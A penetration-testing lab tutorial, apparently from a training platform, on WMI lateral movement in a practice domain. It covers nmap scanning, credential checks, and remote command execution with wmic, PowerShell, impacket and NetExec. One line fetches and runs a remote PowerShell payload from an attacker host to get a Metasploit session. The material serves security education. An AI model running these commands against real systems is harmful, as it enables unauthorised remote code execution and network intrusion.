[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI) is a powerful Windows feature that provides a standardized way to interact with system management information and manage devices and applications in a networked environment. WMI can be used to query system information, configure system settings, and perform administrative tasks on remote machines. It is particularly useful for automation, monitoring, and scripting tasks. WMI communication primarily uses TCP port `135` for the initial connection and dynamically allocated ports in the range `49152-65535` for subsequent data exchange.

## WMI Rights

To effectively use Windows Management Instrumentation (WMI) for lateral movement within a network, it is crucial to have the necessary permissions on the target system. Generally, this means having administrative privileges. However, certain WMI namespaces and operations can be accessed with lower privileges if they are specifically configured to allow it.

By default, only users who are members of the Administrators group can perform remote WMI operations. This is because remote WMI tasks often involve actions that require high-level access, such as querying system information, executing processes, or changing system settings.

## WMI Enumeration

Before using WMI for lateral movement, it is essential to determine which systems have WMI enabled and accessible. Enumeration can be performed using various tools and scripts to identify targets. Here, we will use `nmap` and `netexec` to identify if the target has WMI ports available.

We can use Nmap to scan for open ports on the network to identify systems with WMI services running. Since WMI uses TCP port 135 for the initial connection and dynamic ports in the range 49152-65535 for subsequent communication, a scan targeting these ports can help identify potential targets.


```shell-session
BusySec@htb[/htb]$ nmap -p135,49152-65535 10.129.229.244 -sV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-05 09:03 AST
Nmap scan report for 172.20.0.52
Host is up (0.13s latency).
Not shown: 16378 filtered tcp ports (no-response)
PORT      STATE SERVICE    VERSION
135/tcp   open  msrpc      Microsoft Windows RPC
49667/tcp open  msrpc      Microsoft Windows RPC
49670/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc      Microsoft Windows RPC
49672/tcp open  msrpc      Microsoft Windows RPC
49686/tcp open  msrpc      Microsoft Windows RPC
49731/tcp open  msrpc      Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

To test credentials againts WMI we will use [NetExec](https://github.com/Pennyw0rth/NetExec). Let's select the protocol `wmi` and the account `Helen` and the password `RedRiot88`:


```shell-session
BusySec@htb[/htb]$ netexec wmi 10.129.229.244 -u helen -p RedRiot88
RPC         10.129.229.244  135    SRV01            [*] Windows 10 / Server 2019 Build 17763 (name:SRV01) (domain:inlanefreight.local)
RPC         10.129.229.244  135    SRV01            [+] inlanefreight.local\helen:RedRiot88
```

By default, only administrators can execute actions using WMI remotely. In the above example, the user `helen` doesn't have rights to execute commands on `SRV01` using WMI, because we don't see `(Pwn3d!)`. However, it can still be used to authenticate accounts or verify if credentials are correct. There are rare cases where non-administrator accounts are explicitly configured to use WMI remotely, but this is not the default behavior. Nonetheless, it is worth checking.

We can attempt to execute commands on `SRV02`. We would need to configure `chisel` and use `proxychains` to connect to the target server beforehand:


```shell-session
BusySec@htb[/htb]$ proxychains4 -q netexec wmi 172.20.0.52 -u helen -p RedRiot88
RPC         172.20.0.52     135    SRV02            [*] Windows 10 / Server 2019 Build 17763 (name:SRV02) (domain:inlanefreight.local)
WMI         172.20.0.52     135    SRV02            [+] inlanefreight.local\helen:RedRiot88 (Pwn3d!)
```

In this section, we will perform the exercises against `SRV02`.

## Lateral Movement From Windows

On Windows we can use [wmic](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmic) and PowerShell to interact with WMI. The WMI command-line (WMIC) is a command-line interface that allows administrators to query and manage various aspects of the Windows operating system programmatically. This is achieved through different namespaces and classes. For example, the `Win32_OperatingSystem` class is used for retrieving OS details, `Win32_Process` for managing processes, `Win32_Service` for handling services, and `Win32_ComputerSystem` for overall system information. These classes provide properties that describe the current state of the system and methods to perform administrative actions.

Let's connect via RDP to `SRV01` using helen's credentials.

```shell-session
BusySec@htb[/htb]$ xfreerdp /u:Helen /p:'RedRiot88' /d:inlanefreight.local /v:10.129.229.244 /dynamic-resolution /drive:.,linux
```

To retrieve detailed information about the operating system from a remote computer, we can use the following WMIC command:

```powershell-session
PS C:\Tools> wmic /node:172.20.0.52 os get Caption,CSDVersion,OSArchitecture,Version
Caption                                 CSDVersion  OSArchitecture  Version
Microsoft Windows Server 2019 Standard              64-bit          10.0.17763
```

We can perform the same action using PowerShell:

```powershell-session
PS C:\Tools> Get-WmiObject -Class Win32_OperatingSystem -ComputerName 172.20.0.52 | Select-Object Caption, CSDVersion, OSArchitecture, Version

Caption                                CSDVersion OSArchitecture Version
-------                                ---------- -------------- -------
Microsoft Windows Server 2019 Standard            64-bit         10.0.17763
```

In addition to querying information, WMI also allows for executing commands remotely. This capability is particularly useful for administrative tasks such as starting or stopping processes, running scripts, or changing system configurations without direct machine access. In our case, we can use it for lateral movement. Here is an example of using WMIC to create a new process on a remote machine:

```powershell-session
PS C:\Tools> wmic /node:172.20.0.52 process call create "notepad.exe"
Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ProcessId = 700;
        ReturnValue = 0;
};
```

In this example, the WMIC command is used to remotely start `notepad.exe` on the computer with IP address `172.20.0.52`. The same task can be accomplished using PowerShell for more flexibility and integration with scripts:

```powershell-session
PS C:\Tools> Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "notepad.exe" -ComputerName 172.20.0.52
```

Additionally, we can also specify credentials to within `wmic` or PowerShell:

```powershell-session
PS C:\Tools> wmic /user:username /password:password /node:172.20.0.52 os get Caption,CSDVersion,OSArchitecture,Version
```


```powershell-session
PS C:\Tools> $credential = New-Object System.Management.Automation.PSCredential("username", (ConvertTo-SecureString "password" -AsPlainText -Force));
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "notepad.exe" -ComputerName 172.20.0.52 -Credential $credential
```

We can try to use the same payload we used with `SharpRDP` to get a metasploit session using WMI:

```powershell-session
PS C:\Tools> Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.207/s')" -ComputerName 172.20.0.52

__GENUS          : 2
__CLASS          : __PARAMETERS
__SUPERCLASS     :
__DYNASTY        : __PARAMETERS
__RELPATH        :
__PROPERTY_COUNT : 2
__DERIVATION     : {}
__SERVER         :
__NAMESPACE      :
__PATH           :
ProcessId        : 8084
ReturnValue      : 0
PSComputerName   :
```

**Note:** The WMIC utility is deprecated as of Windows 10, version 21H1, and the 21H1 semi-annual channel release of Windows Server. This utility has been replaced by Windows PowerShell for WMI tasks. For more details, refer to [Chapter 7 - Working with WMI](https://learn.microsoft.com/en-us/powershell/scripting/learn/ps101/07-working-with-wmi). Note that this deprecation only affects the WMIC utility itself; Windows Management Instrumentation (WMI) remains unaffected. For further information, see the list of [Windows 10 features no longer under development](https://learn.microsoft.com/en-us/windows/deployment/planning/windows-10-deprecated-features).

## Lateral Movement From Linux

Interacting with Windows Management Instrumentation (WMI) from a Linux system can be accomplished using various tools and libraries that support the WMI protocol. Below are some commonly used tools for this purpose. `wmic` is a command-line tool that allows you to interact with WMI from Linux. It provides a straightforward way to query and manage Windows systems. To install `wmic`, you need to install the `wmi-client` package. On Debian-based systems, you can install it using the following commands:

```shell-session
BusySec@htb[/htb]$ sudo apt-get install wmi-client
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following NEW packages will be installed:
  wmi-client
0 upgraded, 1 newly installed, 0 to remove and 73 not upgraded.
...SNIP...
```

Once installed, we can use `wmic` to run queries against a remote Windows machine. Here's an example of querying the operating system details:

```shell-session
BusySec@htb[/htb]$ wmic -U inlanefreight.local/helen%RedRiot88 //172.20.0.52 "SELECT Caption, CSDVersion, OSArchitecture, Version FROM Win32_OperatingSystem"
CLASS: Win32_OperatingSystem
Caption|CSDVersion|OSArchitecture|Version
Microsoft Windows Server 2019 Standard|(null)|64-bit|10.0.17763
```

Additionally, `impacket` includes the built-in script [wmiexec.py](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py) for executing commands using WMI. Keep in mind that `wmiexec.py` uses port 445 to retrieve the output of the command and if port 445 is blocked, it won't work. If we want to omit the output, we can use the options `-silentcommand` or `-nooutput`:

```shell-session
BusySec@htb[/htb]$ wmiexec.py inlanefreight/helen:RedRiot88@172.20.0.52 whoami
Impacket v0.12.0.dev1+20240523.75507.15eff88 - Copyright 2023 Fortra

[-] [Errno Connection error (172.20.0.52:445)] timed out
```

```shell-session
BusySec@htb[/htb]$ wmiexec.py inlanefreight/helen:RedRiot88@172.20.0.52 whoami -nooutput
Impacket v0.12.0.dev1+20240523.75507.15eff88 - Copyright 2023 Fortra
```

Alternatively, we can use NetExec to run WMI queries or execute commands using WMI. To perform a query we can use the option `--wmi <QUERY>`:

```shell-session
BusySec@htb[/htb]$ proxychains4 -q netexec wmi 172.20.0.52 -u helen -p RedRiot88 --wmi "SELECT * FROM Win32_OperatingSystem"
RPC         172.20.0.52  135    SRV02            [*] Windows 10 / Server 2019 Build 17763 (name:SRV02) (domain:inlanefreight.local)
WMI         172.20.0.52  135    SRV02            [+] inlanefreight.local\helen:RedRiot88 (Pwn3d!)
WMI         172.20.0.52  135    SRV02            Caption => Microsoft Windows Server 2019 Standard
WMI         172.20.0.52  135    SRV02            Description =>
WMI         172.20.0.52  135    SRV02            Name => Microsoft Windows Server 2019 Standard|C:\Windows|\Device\Harddisk0\Partition4
WMI         172.20.0.52  135    SRV02            Status => OK  
WMI         172.20.0.52  135    SRV02            CSCreationClassName => Win32_ComputerSystem
...SNIP...
```

To execute commands we can use the protocol `wmi` with the option `-x <COMMAND>`. Unlike impacket `wmiexec.py`, netexec can retrieve the output using WMI rather than SMB:
```shell-session
BusySec@htb[/htb]$ proxychains4 -q netexec wmi 172.20.0.52 -u helen -p RedRiot88 -x whoami
RPC         172.20.0.52  135    SRV02            [*] Windows 10 / Server 2019 Build 17763 (name:SRV02) (domain:inlanefreight.local)
WMI         172.20.0.52  135    SRV02            [+] inlanefreight.local\helen:RedRiot88 (Pwn3d!)
WMI         172.20.0.52  135    SRV02            [+] Executed command: "whoami" via wmiexec
WMI         172.20.0.52  135    SRV02            inlanefreight\helen
```
